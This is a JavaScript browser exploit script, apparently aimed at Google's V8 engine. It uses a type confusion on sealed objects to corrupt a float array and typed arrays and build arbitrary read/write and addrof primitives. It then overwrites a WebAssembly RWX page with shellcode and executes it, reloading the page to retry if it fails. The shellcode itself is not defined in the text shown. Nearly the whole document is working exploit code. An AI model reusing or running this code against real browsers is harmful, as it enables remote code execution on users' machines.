// HELPER FUNCTIONS
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
    int_view[0] = this;
    return float_view[0];
}
BigInt.prototype.smi2f = function() {
    int_view[0] = this << 32n;
    return float_view[0];
}
Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0];
}
Number.prototype.f2smi = function() {
    float_view[0] = this;
    return int_view[0] >> 32n;
}
Number.prototype.i2f = function() {
    return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
    return BigInt(this).smi2f();
}

function hex(a) {
    return a.toString(16);
}

// *******************
// Exploit starts here
// *******************
let iter_cnt = 0;
var float_array;
var tarr;
var aarw_tarr;
var obj_addrof;

function get_rw() {
    let arr = [1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1];
    const o = {foo: 1.1};
    for (let i = 0; i < 15; i++) {
        o[i] = i+16;
    }

    // array is used ass padding
    let padding = arr.slice()

    // the first corruption target
    float_array = [1.1];

    // second corruption target
    tarr = new BigUint64Array(2);
    tarr[0] = 0x31313131n;
    tarr[1] = 0x32323232n;

    // typed array used for arbitrary read/write
    aarw_tarr = new BigUint64Array(2);
    aarw_tarr[0] = 0x41414141n;
    aarw_tarr[1] = 0x42424242n;

    // object used to imlpement the addrof primitive
    obj_addrof = {'a': 0x31323334, 'b': 1};
    obj_addrof['b'] = obj_addrof;

    // build a NumberDictionary inside the FixedArray
    o[0] = 8;       // number of elements
    o[1] = 0;       // number of deleted elements
    o[2] = 17;      // capacity;
    o[3] = 256;     // max key/requires slow elements
    // first element of the NumberDictionary
    o[4] = 0;       // key
    o[5] = 0x4141;  // value
    o[6] = 0xc0;    // PropertyDesc

    Object.seal(o);

    const v12 = {foo: 2.2};

    Object.preventExtensions(v12);
    Object.seal(v12);
    const v18 = {foo: Object};
    v12.__proto__ = 0;

    o[0] = 0x4242;
    delete o[1];

    if (float_array[2] !== undefined) {
        // corruption successful, relative and arbitrary RW available after this point
        float_array[tarr_length_offset] = 6.3e-322; // set the length of tarr to 0x80
        return true;
    }

    return false;
}

const tarr_length_offset = 7;       // from the float array
const aarw_tarr_bufferp_offset = 10;
const aarw_tarr_elements_offset = 21;
const obj_prop_b_offset = 29;

function sanity_check() {
    success = true;
    // return true;
    success &= tarr[aarw_tarr_elements_offset+2] == 0x41414141n;
    success &= tarr[aarw_tarr_elements_offset+3] == 0x42424242n;
    success &= tarr[obj_prop_b_offset-1] == 0x3132333400000000n;
    return success;
}

function read8(addr) {
    let original = tarr[aarw_tarr_bufferp_offset];
    tarr[aarw_tarr_bufferp_offset] = (addr - 0xfn);
    let result = aarw_tarr[0];
    tarr[aarw_tarr_bufferp_offset] = original;
    return result;
}

function write8(addr, val) {
    let original = tarr[aarw_tarr_bufferp_offset];
    tarr[aarw_tarr_bufferp_offset] = (addr - 0xfn);
    aarw_tarr[0] = val;
    tarr[aarw_tarr_bufferp_offset] = original;
}

function addrof(o) {
    obj_addrof['b'] = o;
    return tarr[obj_prop_b_offset];
}

var wfunc = null;

function rce() {
    function get_wasm_func() {
        var importObject = {
            imports: { imported_func: arg => console.log(arg) }
        };
        bc = [0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x8, 0x2, 0x60, 0x1, 0x7f, 0x0, 0x60, 0x0, 0x0, 0x2, 0x19, 0x1, 0x7, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0xd, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x0, 0x3, 0x2, 0x1, 0x1, 0x7, 0x11, 0x1, 0xd, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x1, 0xa, 0x8, 0x1, 0x6, 0x0, 0x41, 0x2a, 0x10, 0x0, 0xb];
        wasm_code = new Uint8Array(bc);
        wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), importObject);
        return wasm_mod.exports.exported_func;
    }

    let wasm_func = get_wasm_func();
    wfunc = wasm_func;
    console.log('[+] wasm: ' + wfunc);
    // traverse the JSFunction object chain to find the RWX WebAssembly code page
    let wasm_func_addr = addrof(wasm_func) - 1n;
    console.log('[+] wasm addr: 0x' + hex(wasm_func_addr));

    // %SystemBreak();
    let sfi = read8(wasm_func_addr + 12n*2n) - 1n;
    console.log('[+] sfi: 0x' + hex(sfi));
    let WasmExportedFunctionData = read8(sfi + 4n*2n) - 1n;
    console.log('[+] WasmExportedFunctionData: 0x' + WasmExportedFunctionData.toString(16));

    let instance = read8(WasmExportedFunctionData + 8n*2n) - 1n;
    console.log('[+] instance: 0x' + hex(instance));

    // let rwx_addr = read8(instance + 0x108n);
    let rwx_addr = read8(instance + 0x88n);
    console.log('[+] rwx: 0x' + hex(rwx_addr));

    // write the shellcode to the RWX page
    if (shellcode.length % 2 != 0)
    shellcode += "\u9090";
  
    for (let i = 0; i < shellcode.length; i += 2) {
      write8(rwx_addr + BigInt(i*2), BigInt(shellcode.charCodeAt(i) + shellcode.charCodeAt(i + 1) * 0x10000));
    }
  
    // invoke the shellcode
    wfunc();
}
try {
    for (iter_cnt = 0; iter_cnt < 500; iter_cnt++) {
        if (get_rw()) {
            if (sanity_check() != true) {
                console.log('[!] heap layout sanity check failed, RESTARTING');
                throw '';
            }
            console.log('[+] heap layout sanity check successful, arbitrary RW up');

            rce()
        }
    }

    console.log('[!] Float array corruption unsuccessful, RESTARTING!');
    throw ''
} catch {
    // try again
    setTimeout(function(){ location.reload(); }, 2000);
}